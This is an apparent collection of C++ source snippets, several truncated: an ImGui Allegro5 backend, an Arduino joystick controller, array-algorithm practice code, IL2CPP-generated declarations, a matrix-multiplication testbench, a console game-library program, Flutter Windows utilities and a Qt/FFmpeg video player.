clipping rectangle.\n//  2018-06-11: Misc: Setup io.BackendFlags ImGuiBackendFlags_HasMouseCursors flag + honor ImGuiConfigFlags_NoMouseCursorChange flag.\n//  2018-04-18: Misc: Renamed file from imgui_impl_a5.cpp to imgui_impl_allegro5.cpp.\n//  2018-04-18: Misc: Added support for 32-bit vertex indices to avoid conversion at runtime. Added imconfig_allegro5.h to enforce 32-bit indices when included from imgui.h.\n//  2018-02-16: Misc: Obsoleted the io.RenderDrawListsFn callback and exposed ImGui_ImplAllegro5_RenderDrawData() in the .h file so you can call it yourself.\n//  2018-02-06: Misc: Removed call to ImGui::Shutdown() which is not available from 1.60 WIP, user needs to call CreateContext/DestroyContext themselves.\n//  2018-02-06: Inputs: Added mapping for ImGuiKey_Space.\n\n#include <stdint.h>     // uint64_t\n#include <cstring>      // memcpy\n#include \"imgui.h\"\n#include \"imgui_impl_allegro5.h\"\n\n// Allegro\n#include <allegro5/allegro.h>\n#include <allegro5/allegro_primitives.h>\n#ifdef _WIN32\n#include <allegro5/allegro_windows.h>\n#endif\n#define ALLEGRO_HAS_CLIPBOARD   (ALLEGRO_VERSION_INT >= ((5 << 24) | (1 << 16) | (12 << 8)))    // Clipboard only supported from Allegro 5.1.12\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127) // condition expression is constant\n#endif\n\n// Data\nstatic ALLEGRO_DISPLAY*         g_Display = NULL;\nstatic ALLEGRO_BITMAP*          g_Texture = NULL;\nstatic double                   g_Time = 0.0;\nstatic ALLEGRO_MOUSE_CURSOR*    g_MouseCursorInvisible = NULL;\nstatic ALLEGRO_VERTEX_DECL*     g_VertexDecl = NULL;\nstatic char*                    g_ClipboardTextData = NULL;\n\nstruct ImDrawVertAllegro\n{\n    ImVec2 pos;\n    ImVec2 uv;\n    ALLEGRO_COLOR col;\n};\n\nstatic void ImGui_ImplAllegro5_SetupRenderState(ImDrawData* draw_data)\n{\n    // Setup blending\n    al_set_separate_blender(ALLEGRO_ADD, ALLEGRO_ALPHA, ALLEGRO_INVERSE_ALPHA, ALLEGRO_ADD, ALLEGRO_ONE, ALLEGRO_INVERSE_ALPHA);\n\n    // Setup orthographic projection matrix\n    // Our visible imgui space lies from draw_data->DisplayPos (top left) to draw_data->DisplayPos+data_data->DisplaySize (bottom right).\n    {\n        float L = draw_data->DisplayPos.x;\n        float R = draw_data->DisplayPos.x + draw_data->DisplaySize.x;\n        float T = draw_data->DisplayPos.y;\n        float B = draw_data->DisplayPos.y + draw_data->DisplaySize.y;\n        ALLEGRO_TRANSFORM transform;\n        al_identity_transform(&transform);\n        al_use_transform(&transform);\n        al_orthographic_transform(&transform, L, T, 1.0f, R, B, -1.0f);\n        al_use_projection_transform(&transform);\n    }\n}\n\n// Render function.\nvoid ImGui_ImplAllegro5_RenderDrawData(ImDrawData* draw_data)\n{\n    // Avoid rendering when minimized\n    if (draw_data->DisplaySize.x <= 0.0f || draw_data->DisplaySize.y <= 0.0f)\n        return;\n\n    // Backup Allegro state that will be modified\n    ALLEGRO_TRANSFORM last_transform = *al_get_current_transform();\n    ALLEGRO_TRANSFORM last_projection_transform = *al_get_cu",
    "#include <Mouse.h>\n#include <Keyboard.h>\n\n// Mouse Control\nconst int mouseButtonPin = 3;\nconst int xAxis = A2;\nconst int yAxis = A3;\nbool mouseIsActive = true; // Whether or not to control the mouse\nint mouseSpeedDivisor = 2.5; // Divisor to slow down mouse speed\n\n// Joystick Controls for Keyboard Control\nconst int swPin = 12;\nconst int VrxPin = A1;\nconst int VryPin = A0;\nint xDirection = 0;\nint yDirection = 0;\nint switchState = 1;\nbool isLeftPressed = false;\nbool isRightPressed = false;\nbool isUpPressed = false;\nbool isDownPressed = false;\nint xCenter = 0; // Center value for X-axis\nint yCenter = 0; // Center value for Y-axis\nint deadZone = 200; // Increased dead zone for reduced sensitivity\n\n// Lt button\nconst int ltButtonPin = 4;\nbool ltIsPressed = false;\n\n// Toggle button\nconst int toggleButtonPin = 2;\nint lastToggleButtonState = LOW;\nbool faceBumperToggleOn = false;\n\n// Face and bumper buttons: Lb, Rb, X, Y, A, B\nconst int KEY_RELEASE_DELAY = 100; // in ms\nconst int lbButtonPin = 5;\nconst int rbButtonPin = 6;\nconst int xButtonPin = 7;\nconst int yButtonPin = 8;\nconst int aButtonPin = 9;\nconst int bButtonPin = 10;\nint lastLbButtonState = HIGH;\nint lastRbButtonState = HIGH;\nint lastXButtonState = HIGH;\nint lastYButtonState = HIGH;\nint lastAButtonState = HIGH;\nint lastBButtonState = HIGH;\nbool lbIsPressed = false;\nbool rbIsPressed = false;\nbool xIsPressed = false;\n",
    "#include <bits/stdc++.h>\n#include <vector>\n#include <map>\nusing namespace std;\n\n\nint secondlargest(vector<int> &arr){\n    int largest=arr[0];\n    int res=0;\n    for(int i=1;i<arr.size();i++){\n        if(largest<arr[i]){\n            res=largest;\n            largest=arr[i];\n        }\n        else{\n            if(res<arr[i]){\n                res=arr[i];\n            }\n        }\n    }\n    return res;\n}\n\n\nbool isArraySorted(vector<int>&arr){\n    int curr=arr[0];\n    for(int i=0;i<arr.size();i++){\n        if(arr[i]<curr){\n            return false;\n        }\n        else curr=arr[i];\n    }\n    return true;\n}\n\n//Using Recursion\n\n\nbool isSorted(int *arr, int size){\n    if(size==0 || size==1){\n        return true;\n    }\n    if(*arr>*(arr+1)){\n        return false;\n    }else{\n        return isSorted(arr+1,size-1);\n    }\n}\n\n\nvector <int> removeduplicates(vector <int>& arr){\n    vector<bool> freq(*max_element(arr.begin(),arr.end())+1,false);\n    vector <int> res;\n    for(int num:arr){\n        if(!freq[num]){\n            res.push_back(num);\n            freq[num]=true;\n        }\n    }\n    return res;\n}\n\nvector<int> leftrotateBy1(vector<int> &arr, int k) {\n    int j = arr.size();\n    vector<int> nums(j);  // Initialize nums with the size of arr\n    for (int i = 0; i < j; i++) {\n        nums[(j - k + i) % j] = arr[i];\n    }\n    return nums;\n}\n\nvector <int> moveZeroesToEnd(vector<int> &arr){\n    int firstzero=-1;\n    int j=0;\n    for(int i=0;i<arr.size();i++){\n        if(arr[i]==0 && firstzero==-1){\n            firstzero=arr[i];\n            j=i;\n        }\n        if(arr[i]!=0 && firstzero==0){\n            swap(arr[i],arr[j]);\n            firstzero=arr[j+1];\n            j=j+1;\n        }\n    }\n    return arr;\n}\n\n\nvector<int> unionOfArray(vector<int> arr1, vector<int> arr2){\n    int maxx=max(arr1[arr1.size()-1],arr2[arr2.size()-1]);\n    vector<int> freq(maxx+1,-1);\n    vector<int> result;\n    for(int i=0;i<arr1.size();i++){\n        if(freq[arr1[i]]==-1){\n            freq[arr1[i]]=1;\n            result.push_back(arr1[i]);\n        }\n    }\n    for(int i=0;i<arr2.size();i++){\n        if(freq[arr2[i]]==-1){\n            freq[arr2[i]]=1;\n            result.push_back(arr2[i]);\n        }\n    }\n    return result;\n}\n\n\n\nvector<int> intersectionOfArray(vector<int> arr1, vector<int> arr2){\n    int maxx=max(arr1[arr1.size()-1],arr2[arr2.size()-1]);\n    vector<int> freq(maxx+1,-1);\n    vector<int> result;\n    for(int i=0;i<arr1.size();i++){\n        if(freq[arr1[i]]==-1){\n            freq[arr1[i]]=1;\n        }\n        else{\n            result.push_back(arr1[i]);\n        }\n    }\n    for(int i=0;i<arr2.size();i++){\n        if(freq[arr2[i]]==-1){\n            freq[arr2[i]]=1;\n        }\n        else{\n            result.push_back(arr2[i]);\n        }\n    }\n    return result;\n}\n\n\nint maxconsecutiveones(vector<int> &arr){\n    int count=0;int maxx=0;\n    for (int i = 0; i < arr.size(); i++)\n    {\n        if(arr[i]==1){\n            count++;\n            maxx=max(maxx,count);\n        }else{\n            count=0;\n        }\n    }\n    return count;\n}\n\n\nint numberthatappearsonesothertwice(vector<int> &arr){\n    int res=0;\n    for(int i=0;i<arr.size();i++){\n        res=res^arr[i];\n    }\n    return res;\n}\n\n\nint longestsubarraywithsumk(vector<int> &arr,int k){\n    int sum=0;int count=0;\n    int left=0;\n    int right=0;\n    while(right<arr.size()){\n        sum+=arr[right];\n        while(sum>k){\n            sum-=arr[left];\n            left++;\n        }\n        if(sum==k){\n            count=max(count,right-left+1);\n        }\n        right++;\n    }\n    return count;\n}\n\n\nint longestSubarraywithsumk(vector<int>&arr, int k){\n    map <int, int> premap;\n    int maxlen=0;\n    int sum=0;\n    for(int i=0;i<arr.size();i++){\n        sum+=arr[i];\n        if(sum==k){\n            maxlen=max(maxlen,i+1);\n        }\n        //calculate sum of remaining part\n        int rem=sum-k;\n\n        // calculate length and update maxlen\n\n        if(premap.find(rem)!=premap.end()){\n            int len=i-premap[rem];\n            maxlen=max(maxlen,len);\n        }\n\n        if(premap.find(sum)==premap.end()){\n            premap[sum]=i;\n        }\n    }\n    return maxlen;\n}\n\nvector<int> twosum(vector<int> &num,int target){\n    map<int, int> premap;\n\n    for(int i=0;i<num.size();i++){\n        int n=num[i];\n        int moreneeded=target-n;\n        if(premap.find(moreneeded)!=premap.end()){\n            return {premap[moreneeded],i};\n        }\n        premap[n]=i;\n    }\n    return {-1,-1};\n}\n\nint main(){\n    //int arr[5]={1,2,8,4,5};\n    // int ans=secondlargest(arr);\n    // cout<<ans<<endl;\n    // if(isArraySorted(arr)){\n    //     cout<<\"Sorted\";\n    // }else{\n    //     cout<<\"Unsortedd\";\n    // }\n    \n    // if(isSorted(arr,5)){\n    //     cout<<\"Sorted\";\n    // }else{\n    //     cout<<\"Unsortedd\";\n    // }\n\n    // vector <int> arr={1,0,8,0,9,6,0,3};\n    // for(int i=0;i<arr.size();i++){\n    //     cout<<arr[i]<<\" \";\n    // }\n    // cout<<endl;\n    // vector <int> res=moveZeroesToEnd(arr);\n    // for(in",
    "\ufeff#include \"pch-cpp.hpp\"\n\n#ifndef _MSC_VER\n# include <alloca.h>\n#else\n# include <malloc.h>\n#endif\n\n\n\n\ntemplate <typename R, typename T1>\nstruct VirtualFuncInvoker1\n{\n\ttypedef R (*Func)(void*, T1, const RuntimeMethod*);\n\n\tstatic inline R Invoke (Il2CppMethodSlot slot, RuntimeObject* obj, T1 p1)\n\t{\n\t\tconst VirtualInvokeData& invokeData = il2cpp_codegen_get_virtual_invoke_data(slot, obj);\n\t\treturn ((Func)invokeData.methodPtr)(obj, p1, invokeData.method);\n\t}\n};\n\nstruct Dictionary_2_t645C7B1DAE2D839B52A5E387C165CE13D5465B00;\nstruct Func_2_t8A65018A43098590B8FE77A424204D524E1CDFAE;\nstruct Func_2_t2894A0E655128DCA085A62AC7E91AA50E34051FE;\nstruct Func_2_t2A7432CC4F64D0DF6D8629208B154CF139B39AF2;\nstruct Func_2_t768E45AC224B8B0A2FF0AF51561075C9EA671111;\nstruct Func_2_tD4AE8636BC57AF9B1896888EB2D0CC7EA4CB9D4D;\nstruct Func_2_tDC72553AEF8707070A5FFB9D46F144F9BE06A9EC;\nstruct Func_2_tCF2EB71968412F781C874AB88FAFB49525BC76FA;\nstruct Func_2_t74E67EF682F267BFC373E1C713DA5D46A68F08E4;\nstruct IEnumerable_1_tCE758D940790D6D0D56B457E522C195F8C413AF2;\nstruct IEqualityComparer_1_tF175EE4608832085A0EE2A97DAE545B83F097888;\nstruct IList_1_t3C981BB2E5E26A467A42AF86513CF54136025701;\nstruct RefCounted_t6B975CD3D06E8D955346FC0D66E8F6E449D49A44;\nstruct RefCounted_t0E133AD36715877AE1CE72539A0199B4D3AA8CD1;\nstruct RefCounted_t81BCBAE57D930C934CF7A439452D65303AC6A8CD;\nstruct RefCounted_t78303B1CD3D08C664ABB15EBD7C882DA3E06CF7D;\nstruct RefCounted_tA9FB4D63A1064BD322AFDFCD70319CB384C057D9;\nstruct RefCounted_t812D790A2C787F18230F9234F6C9B84D4AC1A85A;\nstruct WriteDelegate_t6A0EB21668C92D873ACB875924DE54518D8B7234;\nstruct WriteDelegate_t737D0DA8D96562AD76BB67D9C5A5199EDB0171E1;\nstruct WriteDelegate_t907C2DAF3A619B832C6D9441AF1C4CDA7914AF1D;\nstruct WriteDelegate_tE9F20B5E1A664D239EFDD91143B963A216AAB1C7;\nstruct WriteDelegate_t023838BBDB83C818E9FDC98ABFA9A9396823E789;\nstruct WriteDelegate_t98EF2EAAD5827503FF2F0213C32A4961968D75A0;\nstruct WriteDelegate_t055D02BADD3A5DFA009116D80BC93C235313CAE8;\nstruct BooleanU5BU5D_tD317D27C31DB892BE79FAE3AEBC0B3FFB73DE9B4;\nstruct ByteU5BU5D_tA6237BF417AE52AD70CFB4EF24A7A82613DF9031;\nstruct CharU5BU5D_t799905CF001DD5F13F7DBB310181FC4D8B7D0AAB;\nstruct Color32U5BU5D_t38116C3E91765C4C5726CE12C77FAD7F9F737259;\nstruct ComputedTransitionPropertyU5BU5D_t25B9E78F5276CDA297C8215C316452CAB8219E82;\nstruct EnumU5BU5D_t6106A94708E3435454078BF14FA50152B7301912;\nstruct FontWeightU5BU5D_t2A406B5BAB0DD0F06E7F1773DB062E4AF98067BA;\nstruct HighlightStateU5BU5D_tA878A0AF1F4F52882ACD29515AADC277EE135622;\nstruct HighlightStateU5BU5D_tCF5677B4773947CE4C64B938B12AC50DDA347435;\nstruct HorizontalAlignmentOptionsU5BU5D_t4D185662282BFB910D8B9A8199E91578E9422658;\nstruct Int32U5BU5D_t19C97395396A72ECAF310612F0760F165060314C;\nstruct Int32EnumU5BU5D_t87B7DB802810C38016332669039EF42C487A081F;\nstruct IntPtrU5BU5D_tFD177F8C806A6921AD7150264CCC62FA00CAD832;\nstruct MaterialReferenceU5BU5D_t7491D335AB3E3E13CE9C0F5E931F396F6A02E1F2;\nstruct MaterialReferenceU5BU5D_t4A9B88114E223BD96CE5121053664023CE2DE07E;\nstruct ObjectU5BU5D_t8061030B0A12A55D5AD8652A20C922FE99450918;\nstruct PlayableBindingU5BU5D_tC50C3F27A8E4246488F7A5998CAABAC4811A92CD;\nstruct PlayerLoopSystemU5BU5D_t07C04E53AAC3CDA17603E8BA1B41D7E1AC083C6D;\nstruct SingleU5BU5D_t89DEFE97BCEDB5857010E79ECE0F52CF6E93B87C;\nstruct StackTraceU5BU5D_t32FBCB20930EAF5BAE3F450FF75228E5450DA0DF;\nstruct StringU5BU5D_t7674CD946EC0CE7B3AE0BE70E6EE85F2ECD9F248;\nstruct StyleValueHandleU5BU5D_t66B7732469E9E30B1FB9A6E386315DAB36914ADE;\nstruct TMP_ColorGradientU5BU5D_t2F65E8C42F268DFF33BB1392D94BCF5B5087308A;\nstruct TextAlignmentU5BU5D_t756DC2D672145699CB9718DDBA5982ED51A95F49;\nstruct TextColorGradientU5BU5D_tA27A5E49640CF01334A10DBDBC959903AFBD941A;\nstruct TextFontWeightU5BU5D_t3DE32809AEE657255C8333897D61F2EA5279D43F;\nstruct UInt32U5BU5D_t02FBD658AD156A17574ECE6106CF1FBFCC9807FA;\nstruct Vector2U5BU5D_tFEBBC94BCC6C9C88277BA04047D2B3FDB6ED7FDA;\nstruct Vector3U5BU5D_tFF1859CCE176131B909E2044F76443064254679C;\nstruct Vector4U5BU5D_tC0F3A7115F85007510F6D173968200CD31BCF7AD;\nstruct WordWrapStateU5BU5D_t473D59C9DBCC949CE72EF1EB471CBA152A6CEAC9;\nstruct WordWrapStateU5BU5D_t4AA4AAC14B38359416C63A57A1ADDD9C2004EAC8;\nstruct BaseRaycaster_t7DC8158FD3CA0193455344379DD5FF7CD5F1F832;\nstruct BatchDrawCommand_t9DAB9B739DA9EBC6B1BB0D2DD51AF65B12F66BF0;\nstruct BatchDrawRange_t736D745E918A629658B80A0F7D2D17DAFBA6172F;\nstruct Byte_t94D9231AC217BE4D2E004C4CD32DF6D099EA41A3;\nstruct Enum_t2A1A94B24E3B776EEF4E5E485E290BB9D4D072E2;\nstruct Font_tC95270EA3198038970422D78B74A7F2E218A96B6;\nstruct FontAsset_t61A6446D934E582651044E33D250EA8D306AB958;\nstruct GameObject_t76FEDD663AB33C991A9C9A23129337651094216F;\nstruct Glyph_t700CF8EBE04ED4AEAB520885AAA1B309E02A103F;\nstruct IDictionary_t6D03155AF1FA9083817AA5B6AD7DEEACC26AB220;\nstruct Int32_t680FF22E76F6EFAD4375103CBBFFA0421349384C;\nstruct Material_t18053F08F347D0DCA5E1140EC7EC4533DD8A14E3;\nstruct MemberInfo_t;\nstruct Mesh_t6D9C539763A09BC2B12AEAEF36F6DFFC98AE63D4;\nstruct Object_tC12DECB6760A7F2CBF65D9DC",
    "/* Testbench for Complex Matrix Multiplication */\n\n#include <iostream>\n#include <fstream>\n#include \"complex.h\"\n\nvoid loadMatrix(const std::string& filename, int rows, int cols, complex_t* Mat) {\n    std::ifstream file(filename);\n    if (!file) {\n        std::cerr << \"Error opening file: \" << filename << std::endl;\n        exit(EXIT_FAILURE);\n    }\n    \n    for (int i = 0; i < rows; i++) {\n        for (int j = 0; j < cols; j++) {\n            int real, imag;\n            file >> real >> imag;\n            Mat[i * cols + j].real = real;\n            Mat[i * cols + j].imag = imag;\n        }\n    }\n}\n\nint main() {\n\n    complex_t MatA_tb[M_M * M_N];\n    complex_t MatB_tb[M_N * M_K];\n    complex_t MatC_tb[M_M * M_K];\n    complex_t MatC_expected[M_M * M_K];\n\n    loadMatrix(\"MatA.txt\", M_M, M_N, MatA_tb);\n    loadMatrix(\"MatB.txt\", M_N, M_K, MatB_tb);\n    loadMatrix(\"MatC.txt\", M_M, M_K, MatC_expected);\n\n    complex_t MatA_DRAM[M_M][M_N];\n    complex_t MatB_DRAM[M_N][M_K];\n    complex_t MatC_DRAM[M_M][M_K];\n\n    for (int i = 0; i < M_M; i++) {\n        for (int j = 0; j < M_N; j++) {\n            MatA_DRAM[i][j] = MatA_tb[i * M_N + j];\n        }\n    }\n\n    for (int i = 0; i < M_N; i++) {\n        for (int j = 0; j < M_K; j++) {\n            MatB_DRAM[i][j] = MatB_tb[i * M_K + j];\n        }\n    }\n\n    for (int i = 0; i < M_M; i++) {\n        for (int j = 0; j < M_K; j++) {\n            MatC_DRAM[i][j].real = 0;\n            MatC_DRAM[i][j].imag = 0;\n        }\n    }\n\n    complex_matmul(MatA_DRAM, MatB_DRAM, MatC_DRAM);\n\n    bool passed = 1;\n    for (int i = 0; i < M_M; i++) {\n        for (int j = 0; j < M_K; j++) {\n            if (MatC_DRAM[i][j].real != MatC_expected[i * M_K + j].real || \n                MatC_DRAM[i][j].imag != MatC_expected[i * M_K + j].imag) {\n                std::cout << \"Mismatch at MatC[\" << i << \"][\" << j << \"]: Expected: (\" \n                          << MatC_expected[i * M_K + j].real << \" + \" << MatC_expected[i * M_K + j].imag << \"j) \\t Actual: (\" \n                          << MatC_DRAM[i][j].real << \" + \" << MatC_DRAM[i][j].imag << \"j)\" << std::endl;\n                passed = 0;\n            }\n        }\n    }\n\n    if (passed) {\n        std::cout << \"-----------------------------------\\n\";\n        std::cout << \"|         TEST PASSED!            |\\n\";\n        std::cout << \"-----------------------------------\\n\";\n    } else {\n        std::cout << \"-----------------------------------\\n\";\n        std::cout << \"|         TEST FAILED :(          |\\n\";\n        std::cout << \"-----------------------------------\\n\";\n    }\n\n    return !passed;\n}",
    "/*\r\nWalker Sigler\r\n2/15/2022\r\nProgram1.cpp\r\nThis program keeps tracks of a library of video games. It allows a user to load a list of\r\nvideo game data from a file, save video game data to a file, add a video game, remove a video game,\r\ndisplay all video games in the library, and remove all video games.\r\n*/\r\n\r\n#include \"VideoGameLibrary.h\"\r\n#include \"VideoGame.h\"\r\n#include \"Text.h\"\r\n#include <iostream>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n\tint userInput;\r\n\tint maxGames;\r\n\tchar filename[25];\r\n\t\r\n\tcout << \"\\n\\nHow many video games can your library hold?\" << endl;\r\n\tcin >> maxGames;\r\n\twhile(maxGames <= 0)\r\n\t{\r\n\t\tcout << \"\\n\\nYou have to have at least one game in your library.\" << endl;\r\n\t\tcout << \"How many video games can your library hold?\" << endl;\r\n\t\tcin >> maxGames;\r\n\t}\r\n\tVideoGameLibrary* videogameLibrary = new VideoGameLibrary(maxGames);\r\n\t\r\n\tdo\r\n\t{\r\n\t\tcout << \"What would you like to do?\" << endl;\r\n\t\tcout << \"1.  Load video games from file.\" << endl;\r\n\t\tcout << \"2.  Save video games to a file.\" << endl;\r\n\t\tcout << \"3.  Add a video game.\" << endl;\r\n\t\tcout << \"4.  Remove a video game.\" << endl;\r\n\t\tcout << \"5.  Display all video games.\" << endl;\r\n\t\tcout << \"6.  Remove ALL video games from this library and end program.\" << endl;\r\n\t\tcout << \"CHOOSE 1-6:  \";\r\n\r\n\t\t//validates use input\r\n\t\tcin >> userInput;\r\n\t\twhile(userInput <=0 || userInput > 6)\r\n\t\t{\r\n\t\t\tcout << \"That is not a valid choice.\\n\";\r\n\t\t\tcout << \"CHOOSE 1-6:  \";\r\n\t\t\tcin >> userInput;\r\n\t\t}\r\n\t\t\r\n\t\tswitch(userInput)\r\n\t\t{\r\n\t\t\tcase 1:\tcout << \"\\nWhat is the name of the file? (example.txt):  \";\r\n\t\t\t\t\tcin >> filename;\r\n\t\t\t\t\tvideogameLibrary->loadVideoGamesFromFile(filename);\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\t\r\n\t\t\tcase 2: cout << \"\\nWhat do you want to name the file? (example.txt):  \";\r\n\t\t\t\t\tcin >> filename;\r\n\t\t\t\t\tvideogameLibrary->saveToFile(filename); \r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\t\r\n\t\t\tcase 3: videogameLibrary->addVideoGameToArray();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\t\r\n\t\t\t\t\r\n\t\t\tcase 4:\tvideogameLibrary->removeVideoGameFromArray();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\t\r\n\t\t\t\r\n\t\t\tcase 5: videogameLibrary->displayVideoGames();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\t\r\n\t\t\tcase 6: delete videogameLibrary;\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\t\r\n\t\t}\r\n\t\t\r\n\t}while(userInput != 6);\r\n\t\r\n\tcout << endl << \"\\nGOODBYE!\";\r\n\t\r\n\treturn 0;\r\n}\r\n",
    "#include \"utils.h\"\r\n\r\n#include <flutter_windows.h>\r\n#include <io.h>\r\n#include <stdio.h>\r\n#include <windows.h>\r\n\r\n#include <iostream>\r\n\r\nvoid CreateAndAttachConsole() {\r\n  if (::AllocConsole()) {\r\n    FILE *unused;\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\r\n      _dup2(_fileno(stdout), 1);\r\n    }\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\r\n      _dup2(_fileno(stdout), 2);\r\n    }\r\n    std::ios::sync_with_stdio();\r\n    FlutterDesktopResyncOutputStreams();\r\n  }\r\n}\r\n\r\nstd::vector<std::string> GetCommandLineArguments() {\r\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\r\n  int argc;\r\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\r\n  if (argv == nullptr) {\r\n    return std::vector<std::string>();\r\n  }\r\n\r\n  std::vector<std::string> command_line_arguments;\r\n\r\n  // Skip the first argument as it's the binary name.\r\n  for (int i = 1; i < argc; i++) {\r\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\r\n  }\r\n\r\n  ::LocalFree(argv);\r\n\r\n  return command_line_arguments;\r\n}\r\n\r\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\r\n  if (utf16_string == nullptr) {\r\n    return std::string();\r\n  }\r\n  unsigned int target_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      -1, nullptr, 0, nullptr, nullptr)\r\n    -1; // remove the trailing null character\r\n  int input_length = (int)wcslen(utf16_string);\r\n  std::string utf8_string;\r\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\r\n    return utf8_string;\r\n  }\r\n  utf8_string.resize(target_length);\r\n  int converted_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\r\n  if (converted_length == 0) {\r\n    return std::string();\r\n  }\r\n  return utf8_string;\r\n}\r\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n    , formatContext(nullptr)\n    , codecContext(nullptr)\n    , packet(nullptr)\n    , frame(nullptr)\n    , scaleContext(nullptr)\n{\n    ui->setupUi(this);\n    this->setWindowTitle(qVersion());\n\n    qInfo() << av_version_info() << Qt::endl;\n    ui->label_version->setText(av_version_info());\n    ui->label_version_2->setText(QString::number(avcodec_version()));\n\n    // av_register_all() \u51fd\u6570\u5728\u8f83\u65b0\u7684 FFmpeg \u7248\u672c\u4e2d\u5df2\u7ecf\u88ab\u79fb\u9664\n\n    // \u521d\u59cb\u5316FFmpeg\u7684\u7f51\u7edc\u529f\u80fd\n    avformat_network_init();\n\n    // \u8ba1\u65f6\u5668\uff0c\u7528\u4e8e\u5b9a\u65f6\u8bfb\u53d6\u548c\u663e\u793a\u89c6\u9891\u5e27\n    connect(&timer, &QTimer::timeout, this, &MainWindow::showNextFrame);\n}\n\nMainWindow::~MainWindow()\n{\n    if (scaleContext) {\n        sws_freeContext(scaleContext);\n    }\n    if (frame) {\n        av_frame_free(&frame);\n    }\n    if (packet) {\n        av_packet_free(&packet);\n    }\n    if (codecContext) {\n        avcodec_free_context(&codecContext);\n    }\n    if (formatContext) {\n        avformat_close_input(&formatContext);\n    }\n    delete ui;\n}\n\nvoid MainWindow::openVideo(const QString &filePath)\n{\n    // \u6253\u5f00\u89c6\u9891\u6587\u4ef6\n    if (avformat_open_input(&formatContext, filePath.toStdString().c_str(), nullptr, nullptr) < 0) {\n        qDebug() << \"Could not open video file!\";\n        return;\n    }\n\n    // \u83b7\u53d6\u89c6\u9891\u6d41\u4fe1\u606f\n    if (avformat_find_stream_info(formatContext, nullptr) < 0) {\n        qDebug() << \"Could not find stream information!\";\n        return;\n    }\n\n    // \u627e\u5230\u7b2c\u4e00\u4e2a\u89c6\u9891\u6d41\n    int videoStreamIndex = -1;\n    for (int i = 0; i < formatContext->nb_streams; i++) {\n        if (formatContext->streams[i]->codecpar->codec_type == AVMEDIA_TYPE_VIDEO) {\n            videoStreamIndex = i;\n            break;\n        }\n    }\n\n    if (videoStreamIndex == -1) {\n        qDebug() << \"Could not find a video stream!\";\n        return;\n    }\n\n    // \u83b7\u53d6\u89c6\u9891\u6d41\u7684\u89e3\u7801\u5668\n    AVCodecParameters *codecParameters = formatContext->streams[videoStreamIndex]->codecpar;\n    const AVCodec *codec = avcodec_find_decoder(codecParameters->codec_id);\n    if (!codec) {\n        qDebug() << \"Unsupported codec!\";\n        return;\n    }\n\n    // \u521b\u5efa\u89e3\u7801\u5668\u4e0a\u4e0b\u6587\n    codecContext = avcodec_alloc_context3(codec);\n    avcodec_parameters_to_context(codecContext, codecParameters);\n    if (avcodec_open2(codecContext, codec, nullptr) < 0) {\n        qDebug() << \"Could not open codec!\";\n        return;\n    }\n\n    // \u5206\u914d\u5e27\u548c\u6570\u636e\u5305\n    packet = av_packet_alloc();\n    frame = av_frame_alloc();\n\n    // \u542f\u52a8\u8ba1\u65f6\u5668\uff0c\u6bcf33\u6beb\u79d2\u66f4\u65b0\u5e27\uff08\u7ea630\u5e27\u6bcf\u79d2\uff09\n    timer.start(33);\n}\n\nvoid MainWindow::showNextFrame()\n{\n    // \u8bfb\u53d6\u5e27\n    if (av_read_frame(formatContext, packet) >= 0) {\n        if (packet->stream_index == 0) { // \u5047\u8bbe\u6211\u4eec\u53ea\u5904\u7406\u7b2c\u4e00\u4e2a\u89c6\u9891\u6d41\n            avcodec_send_packet(codecContext, packet);\n            int ret = avcodec_receive_frame(codecContext, frame);\n            if (ret == 0) {\n                // \u5904\u7406\u5e27\uff0c\u8f6c\u6362\u4e3aQImage\n                if (!scaleContext) {\n                    scaleContext = sws_getContext(\n                        codecContext->width, codecContext->height, codecContext->pix_fmt,\n                        codecContext->width, codecContext->height, AV_PIX_FMT_RGB24,\n                        0, nullptr, nullptr, nullptr);\n                }\n\n                // \u521b\u5efa\u4e00\u4e2a\u7528\u4e8e\u5b58\u50a8RGB\u56fe\u50cf\u7684\u7f13\u51b2\u533a\n                uint8_t *rgbBuffer = (uint8_t *)av_malloc(av_image_get_buffer_size(AV_PIX_FMT_RGB24, codecContext->width, codecContext->height, 1));\n                AVFrame *rgbFrame = av_frame_alloc();\n                av_image_fill_arrays(rgbFrame->data, rgbFrame->linesize, rgbBuffer,\n                                     AV_PIX_FMT_RGB24, codecContext->width, codecContext->height, 1);\n\n                // \u8fdb\u884c\u683c\u5f0f\u8f6c\u6362\n                sws_scale(scaleContext, frame->data, frame->linesize, 0, codecContext->height, rgbFrame->data, rgbFrame->linesize);\n\n                // \u8f6c\u6362\u4e3aQImage\u5e76\u663e\u793a\n                QImage image(rgbFrame->data[0], codecContext->width, codecContext->height, QImage::Format_RGB888);\n                ui->label_video->setPixmap(QPixmap::fromImage(image));\n\n                av_frame_free(&rgbFrame);\n                av_free(rgbBuffer);\n            }\n        }\n        av_packet_unref(packet);\n    } else {\n        // \u5982\u679c\u8bfb\u53d6\u5931\u8d25\uff0c\u53ef\u4ee5\u91cd\u7f6e\u89c6\u9891\u6216\u505c\u6b62\u64ad\u653e\n        timer.stop();\n    }\n}\n\n// \u6253\u5f00\u89c6\u9891\nvoid MainWindow::on_pushButton_clicked()\n{\n    openVideo(\"/home/whois/QT_FFmpegTest/zhongqiu.mp4\");\n}\n\n",
